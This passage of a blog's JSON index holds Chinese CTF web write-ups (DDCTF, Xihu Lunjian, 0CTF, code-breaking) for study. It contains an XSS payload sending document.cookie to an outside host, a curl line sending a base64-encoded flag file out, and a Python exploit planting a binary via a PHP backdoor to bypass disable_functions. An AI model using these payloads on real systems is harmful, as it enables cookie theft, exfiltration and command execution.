self.wfile.write(return_str) # self.wfile.write(json.dumps(result)) def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) netstat.wait() ps_list = netstat.stdout.readlines() result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = &#123;'local_address': Local_Address, 'Process_name': Process_name&#125; result.append(tmp_dic) return result do_PUT = do_POST do_DELETE = do_GETdef main(): port = 8123 print('Listening on localhost:%s' % port) server = HTTPServer(('0.0.0.0', port), RequestHandler) server.serve_forever()if __name__ == \"__main__\": parser = OptionParser() parser.usage = ( \"Creates an http-server that will echo out any GET or POST parameters, and respond with dummy data\\n\" \"Run:\\n\\n\") (options, args) = parser.parse_args() main()","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/19/2019-DDCTF-web-writeup/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"2019西湖论剑web writeup","date":"2019-04-10T16:00:00.000Z","path":"2019/04/11/2019西湖论剑web-writeup/","text":"比赛的时候刚好清明回家所以上线时间巨短，做了几个水题就比赛结束了2333，比赛一结束主办方就关环境只能口胡了……. 猜猜flag是什么扫一下后台能扫到ds_store泄露，恢复一下有1234yingyingying文件夹index.phpflage10adc3949ba59abbe56e057f20f883e 访问flag提示没有那么容易拿到flag，接着去扫e10adc3949ba59abbe56e057f20f883e居然还有.git泄露……..然后还原出来一个zip压缩包，index.php和lengzhu.jpg，刚好压缩包里面也有lengzhu.jpg，因此可以知道是明文攻击，这里有个坑点就是要用好压压缩才能进行攻击最后拿到hint的内容12code is 9faedd5999937171912159d28b219d86well ok ur good...By the way, flag saved in flag/seed.txt 然后放回网页会看到又来一个随机数，这里就是随机数安全的问题了，去爆破种子然后访问一下/flag/361945.txt就有flag了 breakout首先登陆进去然后就看见里面有个留言框，有个提交框，将url发给管理员，管理员会带上自己的token去查看，还有一个是执行命令的框，但是要有管理员的token在留言里面疯狂尝试发现在onerror后面加个换行符就能绕过了，payload12&lt;img src=x onerror=\"document.location='http://onsdtb.ceye.io/'+document.cookie\"&gt; 然后将访问一下提交框交个main.php给管理员看一下最后用拿到的token在执行框命令执行就行1command=curl http://onsdtb.ceye.io?$(cat /flag.txt|base64)&amp;exec=1 babyt3题目hint提示了dir.php，因为strpos写反了，用dir.php列出目录然后直接file=/ffffflag_1s_Her4就有flag了 blogwriteup：https://blog.dragonsector.pl/2018/07/google-ctf-2018-quals-bbs.htmlhttps://ctftime.org/writeup/10369","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/11/2019西湖论剑web-writeup/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"rips 2017","date":"2019-04-10T16:00:00.000Z","path":"2019/04/11/rips-2017/","text":"之前群里大佬说复现完了ph牛的code breaking可以去rips看一下，然后就去了 wish list","comments":true,"permalink":"https://xi4or0uji.github.io/2019/04/11/rips-2017/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"2019 0ctf wp","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/2019-0ctf-wp/","text":"babyrsa首先pubkey.py可以看到n的值1234from sage.all import GF, PolynomialRingP=PolynomialRing(GF(2),'x')e = 31337n = P('x^2048 + x^2046 + x^2043 + x^2040 + x^2036 + x^2035 + x^2034 + x^2033 + x^2031 + x^2029 + x^2025 + x^2024 + x^2022 + x^2019 + x^2018 + x^2017 + x^2012 + x^2007 + x^2006 + x^2004 + x^2000 + x^1999 + x^1998 + x^1997 + x^1993 + x^1992 + x^1991 + x^1986 + x^1982 + x^1981 + x^1979 + x^1978 + x^1977 + x^1975 + x^1970 + x^1964 + x^1963 + x^1962 + x^1961 + x^1960 + x^1959 + x^1958 + x^1955 + x^1954 + x^1952 + x^1951 + x^1949 + x^1947 + x^1942 + x^1939 + x^1938 + x^1936 + x^1934 + x^1933 + x^1932 + x^1930 + x^1928 + x^1927 + x^1923 + x^1922 + x^1919 + x^1918 + x^1915 + x^1914 + x^1913 + x^1912 + x^1911 + x^1910 + x^1908 + x^1903 + x^1902 + x^1900 + x^1899 + x^1897 + x^1893 + x^1891 + x^1890 + x^1886 + x^1881 + x^1880 + x^1879 + x^1878 + x^1875 + x^1874 + x^1873 + x^1872 + x^1871 + x^1870 + x^1869 + x^1865 + x^1863 + x^1862 + x^1860 + x^1856 + x^1855 + x^1853 + x^1852 + x^1845 + x^1841 + x^1839 + x^1837 + x^1836 + x^1835 + x^1833 + x^1832 + x^1829 + x^1828 + x^1827 + x^1826 + x^1824 + x^1823 + x^1822 + x^1821 + x^1820 + x^1819 + x^1818 + x^1817 + x^1813 + x^1812 + x^1810 + x^1809 + x^1808 + x^1807 + x^1803 + x^1799 + x^1797 + x^1796 + x^1794 + x^1792 + x^1790 + x^1786 + x^1783 + x^1782 + x^1779 + x^1778 + x^1776 + x^1775 + x^1774 + x^1772 + x^1767 + x^1766 + x^1765 + x^1764 + x^1763 + x^1762 + x^1759 + x^1757 + x^1756 + x^1754 + x^1753 + x^1752 + x^1750 + x^1749 + x^1741 + x^1734 + x^1730 + x^1729 + x^1726 + x^1725 + x^1723 + x^1722 + x^1721 + x^1716 + x^1714 + x^1713 + x^1712 + x^1710 + x^1709 + x^1706 + x^1705 + x^1703 + x^1702 + x^1700 + x^1698 + x^1693 + x^1692 + x^1691 + x^1690 + x^1683 + x^1682 + x^1681 + x^1680 + x^1679 + x^1677 + x^1672 + x^1670 + x^1669 + x^1666 + x^1663 + x^1662 + x^1661 + x^1659 + x^1655 + x^1653 + x^1651 + x^1649 + x^1648 + x^1647 + x^1646 + x^1644 + x^1643 + x^1642 + x^1640 + x^1639 + x^1638 + x^1634 + x^1633 + x^1628 + x^1620 + x^1619 + x^1618 + x^1616 + x^1614 + x^1611 + x^1610 + x^1608 + x^1605 + x^1604 + x^1603 + x^1599 + x^1597 + x^1595 + x^1594 + x^1590 + x^1588 + x^1587 + x^1585 + x^1583 + x^1580 + x^1579 + x^1577 + x^1574 + x^1573 + x^1572 + x^1568 + x^1566 + x^1565 + x^1563 + x^1562 + x^1560 + x^1555 + x^1554 + x^1552 + x^1550 + x^1549 + x^1548 + x^1545 + x^1544 + x^1542 + x^1540 + x^1538 + x^1537 + x^1536 + x^1535 + x^1534 + x^1533 + x^1532 + x^1531 + x^1528 + x^1526 + x^1525 + x^1523 + x^1522 + x^1521 + x^1519 + x^1517 + x^1515 + x^1510 + x^1509 + x^1506 + x^1504 + x^1502 + x^1499 + x^1498 + x^1497 + x^1488 + x^1483 + x^1480 + x^1477 + x^1472 + x^1471 + x^1469 + x^1468 + x^1467 + x^1466 + x^1464 + x^1462 + x^1457 + x^1456 + x^1455 + x^1454 + x^1453 + x^1452 + x^1448 + x^1446 + x^1444 + x^1443 + x^1442 + x^1441 + x^1440 + x^1436 + x^1435 + x^1431 + x^1428 + x^1425 + x^1424 + x^1422 + x^1420 + x^1415 + x^1414 + x^1411 + x^1410 + x^1408 + x^1406 + x^1405 + x^1403 + x^1402 + x^1399 + x^1397 + x^1396 + x^1395 + x^1394 + x^1393 + x^1391 + x^1388 + x^1385 + x^1377 + x^1376 + x^1372 + x^1371 + x^1370 + x^1369 + x^1367 + x^1363 + x^1361 + x^1357 + x^1355 + x^1354 + x^1349 + x^1343 + x^1339 + x^1338 + x^1337 + x^1336 + x^1335 + x^1332 + x^1329 + x^1327 + x^1326 + x^1324 + x^1321 + x^1315 + x^1314 + x^1312 + x^1310 + x^1309 + x^1305 + x^1304 + x^1303 + x^1302 + x^1299 + x^1298 + x^1296 + x^1295 + x^1293 + x^1291 + x^1290 + x^1289 + x^1284 + x^1283 + x^1282 + x^1281 + x^1280 + x^1278 + x^1277 + x^1276 + x^1275 + x^1272 + x^1270 + x^1269 + x^1268 + x^1267 + x^1259 + x^1257 + x^1254 + x^1252 + x^1251 + x^1249 + x^1247 + x^1246 + x^1244 + x^1240 + x^1238 + x^1233 + x^1232 + x^1229 + x^1222 + x^1219 + x^1217 + x^1211 + x^1209 + x^1208 + x^1205 + x^1204 + x^1203 + x^1202 + x^1200 + x^1197 + x^1196 + x^1195 + x^1193 + x^1192 + x^1189 + x^1187 + x^1186 + x^1185 + x^1184 + x^1183 + x^1182 + x^1181 + x^1177 + x^1176 + x^1173 + x^1170 + x^1167 + x^1166 + x^1162 + x^1161 + x^1160 + x^1159 + x^1158 + x^1156 + x^1155 + x^1154 + x^1153 + x^1151 + x^1146 + x^1143 + x^1141 + x^1139 + x^1138 + x^1137 + x^1135 + x^1131 + x^1129 + x^1128 + x^1125 + x^1124 + x^1122 + x^1116 + x^1115 + x^1114 + x^1112 + x^1111 + x^1107 + x^1106 + x^1105 + x^1104 + x^1103 + x^1102 + x^1098 + x^1097 + x^1095 + x^1094 + x^1092 + x^1088 + x^1087 + x^1085 + x^1077 + x^1076 + x^1075 + x^1072 + x^1069 + x^1068 + x^1061 + x^1060 + x^1059 + x^1057 + x^1055 + x^1054 + x^1053 + x^1050 + x^1047 + x^1046 + x^1044 + x^1043 + x^1042 + x^1036 + x^1029 + x^1025 + x^1024 + x^1023 + x^1022 + x^1019 + x^1016 + x^1013 + x^1012 + x^1010 + x^1008 + x^1007 + x^1006 + x^1004 + x^1000 + x^996 + x^995 + x^993 + x^992 + x^989 + x^985 + x^983 + x^978 + x^977 + x^975 + x^972 + x^971 + x^970 + x^969 + x^967 + x^963 + x^957 + x^956 + x^952 + x^950 + x^948 + x^945 + x^942 + x^941 + x^940 + x^938 + x^937 + x^936 + x^935 + x^932 + x^931 + x^930 + x^928 + x^927 + x^926 + x^923 + x^921 + x^918 + x^916 + x^914 + x^913 + x^909 + x^906 + x^905 + x^904 + x^902 + x^897 + x^895 + x^892 + x^889 + x^888 + x^887 + x^886 + x^885 + x^884 + x^882 + x^881 + x^879 + x^876 + x^870 + x^868 + x^867 + x^865 + x^862 + x^861 + x^859 + x^858 + x^856 + x^854 + x^848 + x^847 + x^846 + x^843 + x^839 + x^837 + x^836 + x^832 + x^831 + x^830 + x^829 + x^826 + x^823 + x^821 + x^820 + x^817 + x^815 + x^812 + x^809 + x^808 + x^805 + x^803 + x^802 + x^800 + x^799 + x^797 + x^795 + x^793 + x^792 + x^788 + x^786 + x^784 + x^780 + x^775 + x^774 + x^770 + x^768 + x^766 + x^764 + x^761 + x^760 + x^753 + x^752 + x^751 + x^750 + x^747 + x^744 + x^742 + x^741 + x^737 + x^734 + x^732 + x^728 + x^727 + x^724 + x^722 + x^721 + x^719 + x^717 + x^715 + x^714 + x^713 + x^710 + x^709 + x^705 + x^703 + x^701 + x^698 + x^697 + x^695 + x^690 + x^687 + x^685 + x^684 + x^682 + x^681 + x^680 + x^677 + x^676 + x^674 + x^673 + x^672 + x^671 + x^670 + x^669 + x^665 + x^663 + x^659 + x^652 + x^651 + x^650 + x^649 + x^648 + x^647 + x^646 + x^645 + x^642 + x^640 + x^638 + x^632 + x^631 + x^630 + x^629 + x^627 + x^626 + x^623 + x^622 + x^621 + x^620 + x^616 + x^615 + x^610 + x^605 + x^602 + x^601 + x^600 + x^599 + x^598 + x^596 + x^594 + x^593 + x^591 + x^583 + x^581 + x^579 + x^578 + x^577 + x^576 + x^575 + x^573 + x^572 + x^571 + x^570 + x^569 + x^565 + x^563 + x^562 + x^561 + x^559 + x^557 + x^555 + x^552 + x^551 + x^546 + x^544 + x^542 + x^541 + x^540 + x^539 + x^538 + x^537 + x^535 + x^533 + x^530 + x^527 + x^523 + x^522 + x^520 + x^519 + x^515 + x^513 + x^511 + x^509 + x^507 + x^505 + x^504 + x^503 + x^499 + x^497 + x^496 + x^495 + x^493 + x^492 + x^488 + x^486 + x^481 + x^480 + x^479 + x^478 + x^477 + x^472 + x^470 + x^468 + x^467 + x^464 + x^463 + x^460 + x^459 + x^455 + x^454 + x^453 + x^446 + x^445 + x^444 + x^443 + x^440 + x^438 + x^437 + x^432 + x^431 + x^428 + x^427 + x^426 + x^420 + x^419 + x^416 + x^415 + x^414 + x^413 + x^412 + x^411 + x^405 + x^404 + x^401 + x^396 + x^393 + x^392 + x^391 + x^388 + x^387 + x^383 + x^381 + x^380 + x^377 + x^376 + x^369 + x^364 + x^362 + x^358 + x^357 + x^356 + x^355 + x^353 + x^351 + x^349 + x^340 + x^339 + x^338 + x^337 + x^336 + x^335 + x^334 + x^332 + x^330 + x^328 + x^327 + x^326 + x^324 + x^320 + x^318 + x^316 + x^315 + x^309 + x^302 + x^298 + x^292 + x^291 + x^290 + x^289 + x^287 + x^286 + x^285 + x^284 + x^281 + x^279 + x^278 + x^276 + x^274 + x^273 + x^272 + x^271 + x^267 + x^266 + x^264 + x^263 + x^262 + x^260 + x^259 + x^256 + x^254 + x^253 + x^252 + x^251 + x^249 + x^248 + x^247 + x^245 + x^244 + x^241 + x^239 + x^235 + x^234 + x^233 + x^232 + x^231 + x^230 + x^226 + x^224 + x^221 + x^219 + x^218 + x^216 + x^215 + x^214 + x^209 + x^207 + x^206 + x^202 + x^201 + x^198 + x^197 + x^194 + x^193 + x^192 + x^191 + x^189 + x^188 + x^183 + x^182 + x^181 + x^180 + x^179 + x^178 + x^177 + x^175 + x^172 + x^169 + x^168 + x^166 + x^165 + x^164 + x^163 + x^158 + x^157 + x^153 + x^152 + x^149 + x^147 + x^146 + x^144 + x^140 + x^139 + x^136 + x^128 + x^127 + x^126 + x^124 + x^123 + x^122 + x^121 + x^116 + x^115 + x^113 + x^112 + x^109 + x^108 + x^107 + x^106 + x^104 + x^103 + x^102 + x^101 + x^100 + x^99 + x^97 + x^95 + x^94 + x^93 + x^92 + x^87 + x^84 + x^83 + x^82 + x^80 + x^79 + x^78 + x^76 + x^73 + x^70 + x^69 + x^68 + x^67 + x^66 + x^65 + x^63 + x^60 + x^59 + x^57 + x^55 + x^52 + x^51 + x^47 + x^46 + x^45 + x^43 + x^42 + x^40 + x^36 + x^35 + x^30 + x^29 + x^28 + x^27 + x^23 + x^20 + x^17 + x^14 + x^9 + x^7 + x^3 + 1') 然后factor一下，出来两个多项式，一个是p一个是q12p=(x^821 + x^820 + x^819 + x^818 + x^817 + x^814 + x^813 + x^812 + x^810 + x^808 + x^807 + x^804 + x^801 + x^796 + x^795 + x^794 + x^790 + x^787 + x^786 + x^784 + x^781 + x^780 + x^779 + x^778 + x^777 + x^776 + x^775 + x^774 + x^773 + x^771 + x^770 + x^768 + x^766 + x^762 + x^761 + x^760 + x^758 + x^757 + x^752 + x^749 + x^748 + x^747 + x^740 + x^737 + x^736 + x^732 + x^727 + x^723 + x^722 + x^719 + x^718 + x^717 + x^716 + x^715 + x^714 + x^711 + x^710 + x^708 + x^704 + x^703 + x^702 + x^701 + x^700 + x^699 + x^698 + x^696 + x^692 + x^690 + x^689 + x^687 + x^685 + x^683 + x^681 + x^676 + x^674 + x^672 + x^671 + x^670 + x^668 + x^667 + x^665 + x^664 + x^663 + x^661 + x^660 + x^659 + x^657 + x^656 + x^655 + x^651 + x^649 + x^646 + x^644 + x^637 + x^636 + x^634 + x^633 + x^632 + x^631 + x^628 + x^626 + x^625 + x^622 + x^621 + x^620 + x^614 + x^611 + x^609 + x^608 + x^605 + x^604 + x^599 + x^597 + x^592 + x^591 + x^589 + x^580 + x^578 + x^574 + x^572 + x^569 + x^566 + x^565 + x^563 + x^562 + x^560 + x^552 + x^550 + x^545 + x^544 + x^543 + x^542 + x^540 + x^538 + x^537 + x^534 + x^533 + x^528 + x^527 + x^526 + x^523 + x^522 + x^519 + x^518 + x^515 + x^514 + x^512 + x^505 + x^503 + x^502 + x^500 + x^498 + x^496 + x^493 + x^492 + x^491 + x^490 + x^489 + x^487 + x^482 + x^480 + x^479 + x^478 + x^476 + x^474 + x^472 + x^471 + x^470 + x^469 + x^468 + x^466 + x^462 + x^459 + x^458 + x^457 + x^456 + x^454 + x^453 + x^451 + x^449 + x^447 + x^445 + x^443 + x^442 + x^441 + x^440 + x^437 + x^434 + x^428 + x^425 + x^424 + x^423 + x^420 + x^415 + x^412 + x^411 + x^410 + x^408 + x^405 + x^404 + x^403 + x^401 + x^400 + x^394 + x^391 + x^390 + x^389 + x^388 + x^384 + x^383 + x^382 + x^379 + x^378 + x^376 + x^375 + x^372 + x^371 + x^370 + x^368 + x^366 + x^365 + x^364 + x^361 + x^358 + x^357 + x^356 + x^354 + x^351 + x^347 + x^345 + x^344 + x^340 + x^339 + x^335 + x^334 + x^333 + x^332 + x^331 + x^328 + x^326 + x^322 + x^318 + x^315 + x^312 + x^306 + x^303 + x^302 + x^301 + x^300 + x^299 + x^298 + x^297 + x^295 + x^293 + x^291 + x^289 + x^288 + x^287 + x^286 + x^285 + x^282 + x^280 + x^279 + x^277 + x^274 + x^273 + x^270 + x^269 + x^268 + x^263 + x^262 + x^261 + x^259 + x^258 + x^257 + x^256 + x^252 + x^250 + x^249 + x^245 + x^244 + x^243 + x^242 + x^236 + x^234 + x^233 + x^232 + x^228 + x^225 + x^223 + x^222 + x^221 + x^219 + x^218 + x^215 + x^214 + x^213 + x^211 + x^210 + x^209 + x^207 + x^205 + x^203 + x^202 + x^200 + x^198 + x^197 + x^193 + x^191 + x^190 + x^185 + x^184 + x^182 + x^180 + x^179 + x^177 + x^172 + x^168 + x^167 + x^165 + x^163 + x^161 + x^159 + x^157 + x^156 + x^155 + x^154 + x^153 + x^151 + x^150 + x^149 + x^148 + x^146 + x^145 + x^143 + x^139 + x^137 + x^136 + x^135 + x^133 + x^132 + x^130 + x^127 + x^126 + x^125 + x^124 + x^122 + x^121 + x^120 + x^119 + x^117 + x^116 + x^113 + x^111 + x^110 + x^109 + x^108 + x^107 + x^106 + x^105 + x^100 + x^97 + x^95 + x^89 + x^88 + x^87 + x^86 + x^85 + x^84 + x^82 + x^81 + x^80 + x^77 + x^76 + x^75 + x^74 + x^69 + x^67 + x^65 + x^61 + x^59 + x^57 + x^53 + x^52 + x^50 + x^49 + x^48 + x^45 + x^41 + x^40 + x^36 + x^34 + x^33 + x^27 + x^26 + x^24 + x^23 + x^22 + x^21 + x^20 + x^19 + x^18 + x^15 + x^14 + x^12 + x^9 + x^6 + x^4 + x^3 + x + 1)q=(x^1227 + x^1226 + x^1225 + x^1224 + x^1219 + x^1214 + x^1213 + x^1211 + x^1210 + x^1208 + x^1205 + x^1203 + x^1202 + x^1201 + x^1198 + x^1197 + x^1194 + x^1193 + x^1188 + x^1185 + x^1184 + x^1183 + x^1180 + x^1178 + x^1177 + x^1175 + x^1173 + x^1171 + x^1170 + x^1169 + x^1168 + x^1166 + x^1164 + x^1163 + x^1162 + x^1160 + x^1157 + x^1155 + x^1151 + x^1149 + x^1144 + x^1143 + x^1142 + x^1141 + x^1140 + x^1139 + x^1137 + x^1136 + x^1135 + x^1134 + x^1130 + x^1126 + x^1122 + x^1121 + x^1120 + x^1118 + x^1117 + x^1115 + x^1114 + x^1111 + x^1110 + x^1108 + x^1107 + x^1105 + x^1104 + x^1103 + x^1102 + x^1101 + x^1099 + x^1094 + x^1092 + x^1090 + x^1089 + x^1085 + x^1082 + x^1079 + x^1075 + x^1074 + x^1073 + x^1070 + x^1068 + x^1067 + x^1066 + x^1065 + x^1064 + x^1061 + x^1060 + x^1059 + x^1058 + x^1055 + x^1054 + x^1053 + x^1051 + x^1047 + x^1046 + x^1043 + x^1042 + x^1041 + x^1039 + x^1037 + x^1035 + x^1034 + x^1033 + x^1031 + x^1029 + x^1028 + x^1027 + x^1026 + x^1025 + x^1023 + x^1021 + x^1019 + x^1018 + x^1016 + x^1014 + x^1012 + x^1009 + x^1006 + x^1004 + x^1002 + x^1000 + x^999 + x^996 + x^994 + x^993 + x^992 + x^991 + x^990 + x^989 + x^988 + x^984 + x^981 + x^980 + x^978 + x^977 + x^976 + x^974 + x^972 + x^967 + x^965 + x^964 + x^963 + x^962 + x^958 + x^957 + x^955 + x^953 + x^952 + x^951 + x^950 + x^949 + x^948 + x^947 + x^945 + x^944 + x^939 + x^936 + x^935 + x^934 + x^931 + x^930 + x^926 + x^924 + x^923 + x^920 + x^917 + x^913 + x^912 + x^910 + x^909 + x^908 + x^907 + x^906 + x^905 + x^903 + x^902 + x^901 + x^899 + x^896 + x^893 + x^892 + x^891 + x^887 + x^886 + x^885 + x^884 + x^883 + x^880 + x^877 + x^876 + x^872 + x^868 + x^867 + x^864 + x^863 + x^862 + x^861 + x^858 + x^856 + x^855 + x^854 + x^851 + x^847 + x^846 + x^844 + x^843 + x^842 + x^841 + x^840 + x^838 + x^836 + x^835 + x^833 + x^832 + x^830 + x^829 + x^828 + x^826 + x^825 + x^822 + x^821 + x^817 + x^815 + x^812 + x^811 + x^810 + x^808 + x^806 + x^804 + x^803 + x^802 + x^801 + x^800 + x^797 + x^792 + x^790 + x^789 + x^788 + x^787 + x^785 + x^784 + x^783 + x^781 + x^780 + x^778 + x^777 + x^776 + x^774 + x^771 + x^770 + x^769 + x^766 + x^764 + x^762 + x^759 + x^755 + x^751 + x^749 + x^748 + x^747 + x^746 + x^742 + x^737 + x^734 + x^733 + x^729 + x^727 + x^725 + x^724 + x^723 + x^722 + x^720 + x^718 + x^715 + x^713 + x^711 + x^709 + x^707 + x^706 + x^702 + x^699 + x^698 + x^695 + x^692 + x^687 + x^680 + x^679 + x^678 + x^677 + x^676 + x^674 + x^670 + x^669 + x^668 + x^662 + x^656 + x^654 + x^653 + x^652 + x^651 + x^648 + x^646 + x^645 + x^644 + x^642 + x^640 + x^639 + x^638 + x^637 + x^634 + x^633 + x^632 + x^629 + x^628 + x^627 + x^626 + x^625 + x^623 + x^619 + x^617 + x^613 + x^612 + x^611 + x^610 + x^605 + x^604 + x^603 + x^601 + x^597 + x^595 + x^593 + x^591 + x^590 + x^589 + x^588 + x^587 + x^585 + x^583 + x^581 + x^580 + x^577 + x^576 + x^574 + x^573 + x^572 + x^570 + x^569 + x^563 + x^557 + x^555 + x^553 + x^551 + x^548 + x^546 + x^545 + x^541 + x^538 + x^535 + x^534 + x^529 + x^528 + x^527 + x^526 + x^525 + x^524 + x^523 + x^522 + x^521 + x^520 + x^519 + x^518 + x^517 + x^516 + x^515 + x^512 + x^510 + x^509 + x^507 + x^506 + x^503 + x^499 + x^498 + x^497 + x^496 + x^495 + x^493 + x^492 + x^491 + x^487 + x^483 + x^479 + x^477 + x^475 + x^473 + x^467 + x^466 + x^465 + x^464 + x^462 + x^456 + x^455 + x^454 + x^452 + x^445 + x^444 + x^442 + x^438 + x^437 + x^436 + x^435 + x^434 + x^432 + x^431 + x^430 + x^429 + x^427 + x^426 + x^425 + x^424 + x^421 + x^420 + x^419 + x^418 + x^415 + x^412 + x^409 + x^404 + x^399 + x^398 + x^397 + x^396 + x^391 + x^390 + x^389 + x^387 + x^386 + x^385 + x^384 + x^383 + x^382 + x^379 + x^377 + x^376 + x^370 + x^368 + x^366 + x^363 + x^361 + x^356 + x^355 + x^353 + x^350 + x^349 + x^345 + x^343 + x^342 + x^340 + x^339 + x^332 + x^331 + x^329 + x^328 + x^327 + x^324 + x^321 + x^320 + x^315 + x^312 + x^309 + x^308 + x^307 + x^306 + x^305 + x^304 + x^300 + x^299 + x^297 + x^296 + x^295 + x^294 + x^293 + x^292 + x^290 + x^285 + x^284 + x^278 + x^277 + x^276 + x^275 + x^273 + x^272 + x^270 + x^269 + x^268 + x^267 + x^266 + x^265 + x^262 + x^261 + x^260 + x^258 + x^257 + x^256 + x^254 + x^251 + x^250 + x^248 + x^247 + x^245 + x^244 + x^240 + x^237 + x^235 + x^234 + x^233 + x^232 + x^231 + x^229 + x^225 + x^222 + x^220 + x^219 + x^217 + x^216 + x^214 + x^213 + x^210 + x^209 + x^207 + x^203 + x^202 + x^199 + x^196 + x^192 + x^191 + x^188 + x^187 + x^185 + x^184 + x^183 + x^182 + x^174 + x^173 + x^170 + x^169 + x^168 + x^167 + x^166 + x^162 + x^158 + x^157 + x^156 + x^152 + x^150 + x^148 + x^147 + x^146 + x^144 + x^142 + x^141 + x^140 + x^138 + x^137 + x^134 + x^129 + x^128 + x^125 + x^124 + x^123 + x^122 + x^121 + x^120 + x^115 + x^113 + x^112 + x^111 + x^109 + x^108 + x^106 + x^104 + x^101 + x^100 + x^98 + x^96 + x^95 + x^94 + x^92 + x^91 + x^89 + x^87 + x^86 + x^85 + x^84 + x^77 + x^75 + x^73 + x^70 + x^68 + x^67 + x^66 + x^60 + x^57 + x^53 + x^51 + x^50 + x^49 + x^46 + x^44 + x^43 + x^42 + x^41 + x^39 + x^36 + x^35 + x^32 + x^30 + x^28 + x^27 + x^25 + x^24 + x^23 + x^20 + x^18 + x^17 + x^10 + x^9 + x^8 + x^5 + x^4 + x^3 + x^2 + x + 1) 然后就是看论文找到伽罗瓦域的欧拉函数因此我们可以知道1234phi(n)=pm*(1-1/p1)*(1-1/p2) =pm*(1-1/p)*(1-1/q) =2^2048(1-1/2^821)*(1-1/2^1227) =(2^821-1)*(2^1227-1) 所以此时e知道，phi知道，就只剩求d了图中的x就是d，接下来就是求明文了将flag.enc的文件读出来是这段123931938409134006846469410550487073743925192650755116938225541794524723083910240603620279453298714584321800170326063144616472531553643627071552202613402950579120189960424183462876292590831564884347025119938858471788053191321980663696621632084753893732784657023312407591768406322125753947265987815937165961039424015628319982913336402297718720925447102042668906173729998301139577468193468132305331072754842771657432484688590927575895743853584931297836925498250475231655832566787366689988158399203844420168837827423836936015638932385609040452870954522482255864355639427304567768665723098741671323173831781775755570779256 然后跟着sage的加密过程解密就行最后1234m = 12929751515717784223190125071095033840972126618103851506531524795815629301057549901578587618937134822682802098496427474753288112009126414456232355335989529959849075718110296567230826019289845128370864725824070831511344761744559911657462484008064553761322934104763420141593597788688628235476191502377597826935393982157025297683756512358373217719860916477793044899633710148649825902391311211888551231643872435408487897310375126980062534462671993291565349596885502486769512045272366253808741340159426524945255488751645903929814963731986204149626310974886059236306335075272063744650146690027530594609392956631736380597881Lprint hex(m)[2:]s = '666c61677b5031656135655f6b3333705f4e5f61735f415f696e54656765527e7e7e7e7e7e7d6a49c6b2a08d0af76b'print s.decode('hex') Ghost pepper这题一开始是脑洞，题目ghost pepper=鬼辣椒=jolokia，先按提示karaf/karaf登录进去，接着就一直404了……..访问一下jolokia/list寻找可以利用的mbean接下来我们制作一个恶意的bundle，具体过程看这里https://blog.csdn.net/Love_Taylor/article/details/75194394将run以后生成的jar包放去vps上，然后向服务器post json数据，install恶意的bundle包拿到id然后start监听getshell Wallbreaker Easy题目地址：http://111.186.63.208:31340/进去看到一个后门，但是连过去报500，同时也不能执行系统函数，然后肉鸡就卡住了，到了最后twings大师傅带了肉鸡一把，终于做出来了考察点是这个，imagemagick的漏洞 https://www.freebuf.com/articles/web/192052.html原理就是在web应用启动新进程a的时候，a进程内部调用了一个系统函数b，b函数又在系统共享对象c.so里面，所以系统会加载c.so，但是如果我们在加载c.so之前先加载c_evil.so，而且c_evil.so里面恰好也有名字为b的函数，同时c_evil.so优先级比较高，因此系统会调用c_evil.so的b函数而不是c.so的b函数，因此只要c_evil.so可控，我们就可以绕过disable_functions执行任意命令了先本地尝试一波追踪一下可以看到imagick调用的系统函数rouji1.php123&lt;?php$image = new Imagick('Sun.bpg');?&gt; 接下来我们就要伪造这样的函数了poc.c123456#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main(void)&#123; system(\"/bin/ls -al / &gt; /tmp/pwn\"); return 0;&#125; rouji2.php1234&lt;?phpputenv(\"PATH=/tmp\");$image = new Imagick('Sun.bpg');?&gt; 可以看到确实可以成功利用执行任意命令，接下来就打题目了exp如下12345678910111213141516# -*- coding:utf8 -*-import base64import requestsurl = \"http://111.186.63.208:31340/\"evil = open(\"poc1\", \"rb\").read()evil = base64.b64encode(evil)php = \"putenv('PATH=/tmp/1f666575cbdf2d529c7a01658617cbb9');\" \\ \"file_put_contents('/tmp/1f666575cbdf2d529c7a01658617cbb9/bpgdec', base64_decode('\" + evil + \"'));\"\\ \"chmod('/tmp/1f666575cbdf2d529c7a01658617cbb9/bpgdec', 0777);\"\\ \"$image = new Imagick('Sun.bpg');\"\\ \"echo file_get_contents('/tmp/1f666575cbdf2d529c7a01658617cbb9/pwn');\" data = &#123; \"backdoor\": php&#125;print requests.post(url=url, data=data).content poc.c1234567#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main(void)&#123; system(\"/readflag &gt; /tmp/1f666575cbdf2d529c7a01658617cbb9/pwn\"); return 0;&#125;","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/25/2019-0ctf-wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"code breaking thejs","date":"2019-03-24T16:00:00.000Z","path":"2019/03/25/code-breaking-thejs/","text":"菜鸡继续跟着师傅们复现（捂脸这道题利用了lodash实现了一个ejs引擎，在请求的时候进行渲染，师傅们说了是merge有问题，去查看源码在测试过程中发现merge会直接将注入原型的属性的值写去最底层的object，因此只要创建一个对象，都会在原型属性中找到注入的对象在template函数中我们可以找到利用点1234var result = attempt(function() &#123; return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues);&#125;); 看下那个sourceURL1var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\\n' : ''; 